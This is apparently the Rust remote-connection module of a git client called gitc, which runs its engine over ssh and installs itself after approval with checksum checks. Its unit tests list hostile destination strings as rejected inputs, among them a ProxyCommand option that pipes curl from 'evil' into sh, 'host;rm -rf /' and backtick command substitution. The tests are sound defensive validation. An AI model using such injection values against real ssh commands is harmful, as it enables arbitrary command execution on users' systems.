use std::collections::{BTreeMap, HashMap};
use std::io::{BufRead, BufReader, Read, Write};
use std::process::{Child, ChildStdin, ChildStdout, Command, Stdio};
use std::sync::atomic::{AtomicBool, AtomicU64, AtomicUsize, Ordering::SeqCst};
use std::sync::mpsc::{self, Sender};
use std::sync::{Arc, Condvar, Mutex, MutexGuard, Once, OnceLock};
use std::thread::{self, JoinHandle};
use std::time::Duration;

use serde::Deserialize;
use serde_json::{Value, json};
use sha2::{Digest, Sha256};

use super::api::{self, Request};
use super::approvals;
use super::git::{hide_console, now_ms};
use super::session;
use super::types::{RemotePlan, RemoteState, Tab};

const BIN: &str = "~/.local/bin/gitc";
const RELEASE: &str = concat!(env!("CARGO_PKG_REPOSITORY"), "/releases/download/v", env!("CARGO_PKG_VERSION"));
const CONNECT_TIMEOUT: Duration = Duration::from_secs(30);
const PROBE_TIMEOUT: Duration = Duration::from_secs(5);
const SWEEP_EVERY: Duration = Duration::from_secs(15);
const SAID_LIMIT: usize = 4000;
const PROBE_COMMAND: &str = "uname -sm 2>/dev/null && { ~/.local/bin/gitc --version 2>/dev/null; true; } || ver";
const DOWNLOAD_SCRIPT: &str = r#"set -e
command -v curl >/dev/null && command -v sha256sum >/dev/null || exit 2
mkdir -p ~/.local/bin
tmp=$(mktemp -d)
trap 'rm -rf "$tmp"' EXIT
cd "$tmp"
curl -fsSL -m 120 -o dl @RELEASE@/@ASSET@ || exit 2
curl -fsSL -m 60 -o SUMS @RELEASE@/SHA256SUMS || exit 2
want=$(grep -E '(^| )[*]?@ASSET@$' SUMS | awk '{print $1}')
got=$(sha256sum dl | awk '{print $1}')
[ -n "$want" ] && [ "$want" = "$got" ] || exit 3
install -m 755 dl ~/.local/bin/gitc.incoming
mv ~/.local/bin/gitc.incoming ~/.local/bin/gitc"#;
const PUSH_COMMAND: &str = "mkdir -p ~/.local/bin && cat > ~/.local/bin/gitc.incoming && chmod 755 ~/.local/bin/gitc.incoming && mv ~/.local/bin/gitc.incoming ~/.local/bin/gitc";

struct Conn {
    host: String,
    child: Mutex<Child>,
    stdin: Mutex<ChildStdin>,
    pending: Mutex<HashMap<u64, Sender<Result<Value, Fail>>>>,
    alive: AtomicBool,
    closing: AtomicBool,
    next: AtomicU64,
    used_at: AtomicU64,
    in_flight: AtomicUsize,
    version: OnceLock<String>,
    exit: Mutex<Option<i32>>,
    said: Mutex<String>,
}

enum Fail {
    Lost(String),
    Remote(String),
}

#[derive(Deserialize)]
struct Reply {
    id: u64,
    #[serde(default)]
    ok: Option<Value>,
    #[serde(default)]
    err: Option<String>,
}

struct Probe {
    asset: &'static str,
    have: Option<String>,
}

struct Ran {
    code: i32,
    out: String,
    err: String,
}

type Shared<T> = Arc<(Mutex<Option<T>>, Condvar)>;
type Attempts<T> = Mutex<BTreeMap<String, Shared<Result<T, String>>>>;

static CONNS: Mutex<BTreeMap<String, Arc<Conn>>> = Mutex::new(BTreeMap::new());
static CONNECTING: Attempts<Arc<Conn>> = Mutex::new(BTreeMap::new());
static OPENING: Attempts<Tab> = Mutex::new(BTreeMap::new());
static HOLD_MINUTES: AtomicU64 = AtomicU64::new(10);
static NEXT_TAB: AtomicU64 = AtomicU64::new(1);
static SWEEPER: Once = Once::new();

/// Sends a request to `host`'s engine: a read is retried once, a write is sent once after a ping.
pub fn forward(host: &str, req: &Request) -> Result<Value, String> {
    let repeatable = !matches!(
        req,
        Request::Op { .. }
            | Request::Stage { .. }
            | Request::Unstage { .. }
            | Request::Discard { .. }
            | Request::Commit { .. }
            | Request::Resolve { .. }
    );
    for attempt in 0..2 {
        let conn = connection_for(host)?;
        if !repeatable && attempt == 0 && conn.call(&Request::Ping, Some(PROBE_TIMEOUT)).is_err() {
            drop_conn(&conn);
            continue;
        }
        match conn.call(req, None) {
            Ok(value) => return Ok(value),
            Err(Fail::Remote(e)) => return Err(e),
            Err(Fail::Lost(e)) => {
                drop_conn(&conn);
                if !repeatable || attempt == 1 {
                    return Err(format!("{host}: {e}"));
                }
            }
        }
    }
    Err(format!("{host}: the connection keeps dropping"))
}

/// Opens a repository on `host` under an id both engines share, and adds its tab here.
pub fn open_remote_repo(host: &str, path: &str) -> Result<Tab, String> {
    if let Some(tab) = existing_tab(host, path) {
        session::adopt_tab(tab.clone());
        return Ok(tab);
    }
    joined(&OPENING, &format!("{host}\n{path}"), || match existing_tab(host, path) {
        Some(tab) => Ok(tab),
        None => open_once(host, path),
    })
}

/// What connecting to `host` would do about the gitc there, without writing anything.
pub fn plan_remote(host: &str) -> RemotePlan {
    let mut plan = RemotePlan {
        host: host.to_string(),
        want: crate::VERSION.to_string(),
        path: BIN.to_string(),
        ..Default::default()
    };
    if !is_safe_destination(host) {
        plan.action = "refused".into();
        plan.refusal = Some(format!("\"{host}\" is not a usable ssh destination"));
        return plan;
    }
    match probe(host) {
        Err(why) => {
            plan.action = "refused".into();
            plan.refusal = Some(why);
        }
        Ok(found) => {
            plan.action = match found.have.as_deref() {
                Some(v) if v == crate::VERSION => "ready",
                Some(_) => "replace",
                None => "install",
            }
            .into();
            plan.have = found.have;
        }
    }
    plan
}

/// Refuses anything ssh could read as an option, or that is not plausibly a destination.
pub fn is_safe_destination(host: &str) -> bool {
    !host.is_empty()
        && host.len() <= 255
        && !host.starts_with('-')
        && host.chars().all(|c| c.is_ascii_alphanumeric() || "._@:[]-".contains(c))
}

pub fn states() -> Vec<RemoteState> {
    let mut hosts: Vec<String> = Vec::new();
    for host in session::snapshot().tabs.into_iter().filter_map(|t| t.host) {
        if !hosts.contains(&host) {
            hosts.push(host);
        }
    }
    let conns = lock(&CONNS).clone();
    let connecting: Vec<String> = lock(&CONNECTING).keys().cloned().collect();
    hosts
        .into_iter()
        .map(|host| {
            let conn = conns.get(&host).filter(|c| c.alive.load(SeqCst));
            let state = match conn {
                Some(_) => "online",
                None if connecting.contains(&host) => "connecting",
                None => "offline",
            };
            let version = conn.and_then(|c| c.version.get().cloned()).unwrap_or_default();
            RemoteState { host, state: state.into(), version }
        })
        .collect()
}

/// Closes the connection to `host` once no tab uses it.
pub fn release_host(host: &str) {
    if session::snapshot().tabs.iter().any(|t| t.host.as_deref() == Some(host)) {
        return;
    }
    let conn = lock(&CONNS).remove(host);
    if let Some(conn) = conn {
        conn.close();
    }
}

/// Minutes to hold a connection whose tab is not in front, 0 for forever.
pub fn set_hold(minutes: u64) {
    HOLD_MINUTES.store(minutes, SeqCst);
}

/// The `--stdio` server: one JSON request per line in, one JSON reply per line out.
pub fn serve_stdio() {
    session::set_ephemeral();
    for line in std::io::stdin().lock().lines() {
        let Ok(line) = line else { break };
        if line.trim().is_empty() {
            continue;
        }
        thread::spawn(move || {
            let reply = answer(&line);
            let mut out = std::io::stdout().lock();
            let _ = writeln!(out, "{reply}");
            let _ = out.flush();
        });
    }
}

impl Conn {
    fn call(&self, req: &Request, wait: Option<Duration>) -> Result<Value, Fail> {
        let id = self.next.fetch_add(1, SeqCst);
        let (tx, rx) = mpsc::channel();
        {
            let mut pending = lock(&self.pending);
            if !self.alive.load(SeqCst) {
                return Err(Fail::Lost("the connection has closed".into()));
            }
            pending.insert(id, tx);
        }
        self.in_flight.fetch_add(1, SeqCst);
        let result = self.send(id, req).and_then(|()| {
            let got = match wait {
                Some(limit) => rx.recv_timeout(limit).map_err(|_| "the remote engine did not answer in time"),
                None => rx.recv().map_err(|_| "the connection has closed"),
            };
            got.map_err(|e| Fail::Lost(e.into()))?
        });
        lock(&self.pending).remove(&id);
        self.in_flight.fetch_sub(1, SeqCst);
        self.used_at.store(now_ms(), SeqCst);
        result
    }

    fn send(&self, id: u64, req: &Request) -> Result<(), Fail> {
        let mut line = json!({ "id": id, "req": req }).to_string();
        line.push('\n');
        let mut stdin = lock(&self.stdin);
        stdin.write_all(line.as_bytes()).and_then(|()| stdin.flush()).map_err(|e| Fail::Lost(e.to_string()))
    }

    fn read_replies(self: Arc<Self>, out: ChildStdout, errs: JoinHandle<()>) {
        for line in BufReader::new(out).lines() {
            let Ok(line) = line else { break };
            let Ok(reply) = serde_json::from_str::<Reply>(&line) else {
                self.note(&line);
                continue;
            };
            let Some(tx) = lock(&self.pending).remove(&reply.id) else { continue };
            let _ = tx.send(match reply.err {
                Some(e) => Err(Fail::Remote(e)),
                None => Ok(reply.ok.unwrap_or(Value::Null)),
            });
        }
        let code = self.reap();
        let _ = errs.join();
        *lock(&self.exit) = code;
        let why = self.why();
        {
            let mut pending = lock(&self.pending);
            self.alive.store(false, SeqCst);
            for (_, tx) in pending.drain() {
                let _ = tx.send(Err(Fail::Lost(why.clone())));
            }
        }
        if !self.closing.load(SeqCst) {
            eprintln!("[remote] {} ended on its own, code {code:?}: {why}", self.host);
        }
        unpublish(&self);
    }

    fn collect(&self, mut err: impl Read) {
        let mut buf = [0u8; 4096];
        while let Ok(n) = err.read(&mut buf) {
            let Some(chunk) = buf.get(..n).filter(|c| !c.is_empty()) else { break };
            self.note(&String::from_utf8_lossy(chunk));
        }
    }

    fn note(&self, text: &str) {
        let mut said = lock(&self.said);
        if said.len() < SAID_LIMIT {
            said.push_str(text.trim_end());
            said.push('\n');
        }
    }

    fn why(&self) -> String {
        let said = lock(&self.said).trim().to_string();
        if said.is_empty() { "the remote engine ended without saying why".into() } else { said }
    }

    fn reap(&self) -> Option<i32> {
        for _ in 0..50 {
            if let Ok(Some(status)) = lock(&self.child).try_wait() {
                return status.code();
            }
            thread::sleep(Duration::from_millis(100));
        }
        let mut child = lock(&self.child);
        let _ = child.kill();
        child.wait().ok().and_then(|s| s.code())
    }

    fn close(&self) {
        self.closing.store(true, SeqCst);
        let _ = lock(&self.child).kill();
    }
}

impl Fail {
    fn text(self) -> String {
        match self {
            Fail::Lost(e) | Fail::Remote(e) => e,
        }
    }
}

fn connection_for(host: &str) -> Result<Arc<Conn>, String> {
    if let Some(conn) = live(host) {
        return Ok(conn);
    }
    joined(&CONNECTING, host, || match live(host) {
        Some(conn) => Ok(conn),
        None => open_connection(host),
    })
}

fn open_connection(host: &str) -> Result<Arc<Conn>, String> {
    if !is_safe_destination(host) {
        return Err(format!("\"{host}\" is not a usable ssh destination"));
    }
    let conn = match connect(host) {
        Ok(conn) => conn,
        Err((Some(255) | None, why)) => return Err(format!("could not reach {host}: {why}")),
        Err(_) => {
            ensure(host)?;
            connect(host).map_err(|(_, why)| format!("could not start gitc on {host}: {why}"))?
        }
    };
    register_tabs(host, &conn);
    lock(&CONNS).insert(host.to_string(), conn.clone());
    if !conn.alive.load(SeqCst) {
        unpublish(&conn);
        return Err(format!("the connection to {host} dropped while it was being set up"));
    }
    SWEEPER.call_once(|| {
        thread::spawn(|| {
            loop {
                thread::sleep(SWEEP_EVERY);
                sweep();
            }
        });
    });
    Ok(conn)
}

fn connect(host: &str) -> Result<Arc<Conn>, (Option<i32>, String)> {
    let serve =
        format!("{BIN} --version 2>/dev/null | grep -qx '{} {}' && exec {BIN} --stdio", crate::NAME, crate::VERSION);
    let mut cmd = ssh_command(host, &["-T", "-o", "ServerAliveInterval=15", "-o", "ServerAliveCountMax=3"]);
    cmd.arg(serve).stdin(Stdio::piped()).stdout(Stdio::piped()).stderr(Stdio::piped());
    let child = cmd.spawn().map_err(|e| (None, format!("could not start ssh: {e}")))?;
    attach(host, child)
}

fn attach(host: &str, mut child: Child) -> Result<Arc<Conn>, (Option<i32>, String)> {
    let (Some(stdin), Some(stdout), Some(stderr)) = (child.stdin.take(), child.stdout.take(), child.stderr.take())
    else {
        let _ = child.kill();
        let _ = child.wait();
        return Err((None, "could not talk to ssh".into()));
    };
    let conn = Arc::new(Conn {
        host: host.to_string(),
        child: Mutex::new(child),
        stdin: Mutex::new(stdin),
        pending: Mutex::new(HashMap::new()),
        alive: AtomicBool::new(true),
        closing: AtomicBool::new(false),
        next: AtomicU64::new(1),
        used_at: AtomicU64::new(now_ms()),
        in_flight: AtomicUsize::new(0),
        version: OnceLock::new(),
        exit: Mutex::new(None),
        said: Mutex::new(String::new()),
    });
    let errs = {
        let conn = conn.clone();
        thread::spawn(move || conn.collect(stderr))
    };
    {
        let conn = conn.clone();
        thread::spawn(move || conn.read_replies(stdout, errs));
    }
    match conn.call(&Request::Ping, Some(CONNECT_TIMEOUT)) {
        Ok(ping) => {
            let version = ping.get("version").and_then(Value::as_str).unwrap_or_default();
            let _ = conn.version.set(version.to_string());
            Ok(conn)
        }
        Err(Fail::Lost(_)) if !conn.alive.load(SeqCst) => Err((*lock(&conn.exit), conn.why())),
        Err(fail) => {
            conn.close();
            Err((None, fail.text()))
        }
    }
}

fn register_tabs(host: &str, conn: &Conn) {
    let tabs: Vec<Tab> = session::snapshot().tabs.into_iter().filter(|t| t.host.as_deref() == Some(host)).collect();
    thread::scope(|s| {
        for tab in &tabs {
            s.spawn(move || {
                if let Err(e) = conn.call(&open_request(&tab.path, &tab.id), None) {
                    eprintln!("[remote] {host} could not reopen {}: {}", tab.path, e.text());
                }
            });
        }
    });
}

fn open_once(host: &str, path: &str) -> Result<Tab, String> {
    let conn = connection_for(host)?;
    let wanted = format!("r{}-{}", now_ms(), NEXT_TAB.fetch_add(1, SeqCst));
    let answer = conn
        .call(&open_request(path, &wanted), None)
        .map_err(|f| format!("{host} would not open {path}: {}", f.text()))?;
    let mut tab: Tab = serde_json::from_value(answer.get("tab").cloned().unwrap_or_default())
        .map_err(|e| format!("{host} answered the open with something unreadable: {e}"))?;
    let snapshot = session::snapshot();
    if tab.id.is_empty() || snapshot.tabs.iter().any(|t| t.id == tab.id) {
        tab.id = wanted;
    }
    tab.path = path.to_string();
    tab.host = Some(host.to_string());
    tab.workspaces = vec![snapshot.workspace];
    session::adopt_tab(tab.clone());
    Ok(tab)
}

fn ensure(host: &str) -> Result<(), String> {
    let found = probe(host)?;
    if found.have.as_deref() == Some(crate::VERSION) {
        return Ok(());
    }
    if !approvals::is_approved_remote(host) {
        let what = match &found.have {
            None => format!("gitc is not installed on {host}"),
            Some(v) => format!("{host} has gitc {v}, and this one is {}", crate::VERSION),
        };
        return Err(format!("{what}; approve the machine to let gitc install itself there"));
    }
    let script = DOWNLOAD_SCRIPT.replace("@RELEASE@", RELEASE).replace("@ASSET@", found.asset);
    match ssh_run(host, &script, None).code {
        0 => verify(host),
        3 => Err("the binary the remote downloaded did not match its published checksum".into()),
        _ => push(host, found.asset),
    }
}

fn push(host: &str, asset: &str) -> Result<(), String> {
    let binary = fetch(&format!("{RELEASE}/{asset}"))
        .map_err(|e| format!("the remote could not download gitc, and neither could this machine: {e}"))?;
    let sums = fetch(&format!("{RELEASE}/SHA256SUMS"))
        .map_err(|e| format!("could not fetch the checksums for v{}: {e}", crate::VERSION))?;
    let Some(want) = expected_sum(&String::from_utf8_lossy(&sums), asset) else {
        return Err(format!("the published checksums do not list {asset}"));
    };
    let got = format!("{:x}", Sha256::digest(&binary));
    if !want.eq_ignore_ascii_case(&got) {
        return Err("the gitc downloaded here did not match its published checksum".into());
    }
    let placed = ssh_run(host, PUSH_COMMAND, Some(binary));
    if placed.code != 0 {
        return Err(format!("could not copy gitc to {host}: {}", placed.err.trim()));
    }
    verify(host)
}

fn verify(host: &str) -> Result<(), String> {
    let ran = ssh_run(host, &format!("{BIN} --version 2>/dev/null || true"), None);
    let now = version_in(&ran.out);
    if now.as_deref() == Some(crate::VERSION) {
        return Ok(());
    }
    Err(format!("{host} now reports gitc {}, expected {}", now.unwrap_or_else(|| "none".into()), crate::VERSION))
}

fn probe(host: &str) -> Result<Probe, String> {
    let ran = ssh_run(host, PROBE_COMMAND, None);
    if ran.code == 255 {
        return Err(format!("could not reach {host}: {}", ran.err.trim()));
    }
    classify(&format!("{}\n{}", ran.out, ran.err))
}

fn classify(output: &str) -> Result<Probe, String> {
    let text = output.trim();
    let lower = text.to_lowercase();
    if lower.starts_with("linux") {
        let arch = lower.split_whitespace().nth(1).unwrap_or_default();
        if arch != "x86_64" {
            return Err(format!("gitc publishes a Linux binary for x86_64 only, and this machine is {arch}"));
        }
        return Ok(Probe { asset: "gitc", have: version_in(text) });
    }
    if lower.contains("microsoft windows") || lower.contains("windows [version") {
        return Err("gitc cannot install itself on a Windows host yet: its remote install speaks sh, not cmd".into());
    }
    if lower.starts_with("darwin") {
        return Err("gitc does not publish a macOS binary yet, so there is nothing to install there".into());
    }
    if text.is_empty() {
        return Err("the remote did not say what it is".into());
    }
    Err(format!("unrecognised remote platform: {}", text.lines().next().unwrap_or_default()))
}

fn version_in(output: &str) -> Option<String> {
    output.lines().find_map(|l| l.trim().strip_prefix("gitc ")).map(|v| v.trim().to_string())
}

fn expected_sum(text: &str, asset: &str) -> Option<String> {
    text.lines().find_map(|line| {
        let mut parts = line.split_whitespace();
        let (sum, name) = (parts.next()?, parts.next()?);
        (name.strip_prefix('*').unwrap_or(name) == asset).then(|| sum.to_string())
    })
}

fn fetch(url: &str) -> Result<Vec<u8>, String> {
    let mut resp = ureq::get(url)
        .config()
        .timeout_global(Some(Duration::from_secs(300)))
        .build()
        .call()
        .map_err(|e| e.to_string())?;
    resp.body_mut().with_config().limit(512 * 1024 * 1024).read_to_vec().map_err(|e| e.to_string())
}

fn ssh_run(host: &str, command: &str, input: Option<Vec<u8>>) -> Ran {
    let refused = |err: String| Ran { code: 127, out: String::new(), err };
    if !is_safe_destination(host) {
        return refused("refusing an unsafe ssh destination".into());
    }
    let mut cmd = ssh_command(host, &[]);
    cmd.arg(command)
        .stdin(if input.is_some() { Stdio::piped() } else { Stdio::null() })
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    let mut child = match cmd.spawn() {
        Ok(child) => child,
        Err(e) => return refused(format!("could not start ssh: {e}")),
    };
    let feeder = child.stdin.take().map(|mut pipe| {
        let bytes = input.unwrap_or_default();
        thread::spawn(move || {
            let _ = pipe.write_all(&bytes);
        })
    });
    let output = child.wait_with_output();
    if let Some(feeder) = feeder {
        let _ = feeder.join();
    }
    match output {
        Ok(o) => Ran {
            code: o.status.code().unwrap_or(1),
            out: String::from_utf8_lossy(&o.stdout).into_owned(),
            err: String::from_utf8_lossy(&o.stderr).into_owned(),
        },
        Err(e) => refused(format!("ssh did not finish: {e}")),
    }
}

fn ssh_command(host: &str, extra: &[&str]) -> Command {
    let mut cmd = Command::new("ssh");
    cmd.args(["-o", "BatchMode=yes", "-o", "ConnectTimeout=15"]).args(extra).arg("--").arg(host);
    hide_console(&mut cmd);
    cmd
}

fn sweep() {
    let hold = HOLD_MINUTES.load(SeqCst);
    if hold == 0 {
        return;
    }
    let snapshot = session::snapshot();
    let in_front =
        snapshot.tabs.iter().find(|t| snapshot.active_id.as_ref() == Some(&t.id)).and_then(|t| t.host.clone());
    let now = now_ms();
    let idle: Vec<Arc<Conn>> = {
        let mut conns = lock(&CONNS);
        let hosts: Vec<String> = conns
            .iter()
            .filter(|(host, conn)| {
                if in_front.as_ref() == Some(*host) {
                    conn.used_at.store(now, SeqCst);
                    return false;
                }
                conn.in_flight.load(SeqCst) == 0 && now.saturating_sub(conn.used_at.load(SeqCst)) >= hold * 60_000
            })
            .map(|(host, _)| host.clone())
            .collect();
        hosts.iter().filter_map(|h| conns.remove(h)).collect()
    };
    for conn in idle {
        eprintln!("[remote] closed {} after {hold} idle minutes", conn.host);
        conn.close();
    }
}

fn answer(line: &str) -> Value {
    let parsed: Value = serde_json::from_str(line).unwrap_or_default();
    let id = parsed.get("id").and_then(Value::as_u64).unwrap_or(0);
    let result = parsed
        .get("req")
        .cloned()
        .ok_or_else(|| "no request in that line".to_string())
        .and_then(|r| serde_json::from_value::<Request>(r).map_err(|e| e.to_string()))
        .and_then(api::handle_local)
        .and_then(|a| a.json());
    match result {
        Ok(value) => json!({ "id": id, "ok": value }),
        Err(e) => json!({ "id": id, "err": e }),
    }
}

fn open_request(path: &str, id: &str) -> Request {
    Request::Open { path: path.to_string(), host: String::new(), want_id: Some(id.to_string()) }
}

fn existing_tab(host: &str, path: &str) -> Option<Tab> {
    session::snapshot().tabs.into_iter().find(|t| t.host.as_deref() == Some(host) && t.path == path)
}

fn live(host: &str) -> Option<Arc<Conn>> {
    lock(&CONNS).get(host).filter(|c| c.alive.load(SeqCst)).cloned()
}

fn drop_conn(conn: &Arc<Conn>) {
    unpublish(conn);
    conn.close();
}

fn unpublish(conn: &Arc<Conn>) {
    let mut conns = lock(&CONNS);
    if conns.get(&conn.host).is_some_and(|c| Arc::ptr_eq(c, conn)) {
        conns.remove(&conn.host);
    }
}

fn joined<T: Clone>(map: &Mutex<BTreeMap<String, Shared<T>>>, key: &str, run: impl FnOnce() -> T) -> T {
    let (slot, mine) = {
        let mut map = lock(map);
        match map.get(key) {
            Some(slot) => (slot.clone(), false),
            None => {
                let slot: Shared<T> = Arc::default();
                map.insert(key.to_string(), slot.clone());
                (slot, true)
            }
        }
    };
    if mine {
        let value = run();
        *lock(&slot.0) = Some(value.clone());
        lock(map).remove(key);
        slot.1.notify_all();
        return value;
    }
    let mut done = lock(&slot.0);
    loop {
        if let Some(value) = done.as_ref() {
            return value.clone();
        }
        done = slot.1.wait(done).unwrap_or_else(|e| e.into_inner());
    }
}

fn lock<T>(m: &Mutex<T>) -> MutexGuard<'_, T> {
    m.lock().unwrap_or_else(|e| e.into_inner())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn safe_destinations() {
        for ok in ["build", "adri@adri-web.dev", "adri@10.0.0.4", "[fe80::1]"] {
            assert!(is_safe_destination(ok), "{ok}");
        }
        for bad in [
            "-oProxyCommand=x",
            "-oProxyCommand=sh -c \"curl evil|sh\"",
            "host with space",
            "host;rm -rf /",
            "host`id`",
            "host|sh",
            "host\nother",
            "",
        ] {
            assert!(!is_safe_destination(bad), "{bad}");
        }
    }

    #[test]
    fn option_shaped_host_is_refused_unasked() {
        let plan = plan_remote("-oProxyCommand=touch /tmp/pwned");
        assert_eq!(plan.action, "refused");
        assert_eq!(plan.have, None);
    }

    #[test]
    fn classifies_remotes() {
        let linux = classify("Linux x86_64\ngitc 1.2.3\n").ok().map(|p| (p.asset, p.have));
        assert_eq!(linux, Some(("gitc", Some("1.2.3".to_string()))));
        assert_eq!(classify("Linux x86_64\n").ok().and_then(|p| p.have), None);
        assert!(classify("Linux aarch64\n").is_err());
        assert!(classify("Microsoft Windows [Version 10.0.19045]").is_err());
        assert!(classify("Darwin arm64").is_err());
        assert!(classify("").is_err());
    }

    #[test]
    fn reads_checksums() {
        let sums = "abc  gitc\ndef *gitc.exe\n";
        assert_eq!(expected_sum(sums, "gitc").as_deref(), Some("abc"));
        assert_eq!(expected_sum(sums, "gitc.exe").as_deref(), Some("def"));
        assert_eq!(expected_sum(sums, "gitc-mac"), None);
    }

    #[test]
    fn unreadable_requests_get_an_error_reply() {
        let reply = answer("not json");
        assert_eq!(reply.get("id").and_then(Value::as_u64), Some(0));
        assert!(reply.get("err").is_some());
        let reply = answer(r#"{"id":7,"req":{"call":"noSuchCall"}}"#);
        assert_eq!(reply.get("id").and_then(Value::as_u64), Some(7));
        assert!(reply.get("err").is_some());
    }

    #[test]
    fn replies_reach_their_callers() {
        let Ok(child) = Command::new("cat").stdin(Stdio::piped()).stdout(Stdio::piped()).stderr(Stdio::piped()).spawn()
        else {
            return;
        };
        let conn = attach("echo", child);
        assert!(conn.is_ok(), "handshake failed");
        let Ok(conn) = conn else { return };
        thread::scope(|s| {
            for _ in 0..8 {
                s.spawn(|| assert!(conn.call(&Request::Session, Some(CONNECT_TIMEOUT)).is_ok()));
            }
        });
        assert!(lock(&conn.pending).is_empty());
        conn.close();
        let deadline = now_ms() + 10_000;
        while conn.alive.load(SeqCst) && now_ms() < deadline {
            thread::sleep(Duration::from_millis(20));
        }
        assert!(matches!(conn.call(&Request::Session, Some(PROBE_TIMEOUT)), Err(Fail::Lost(_))));
    }
}
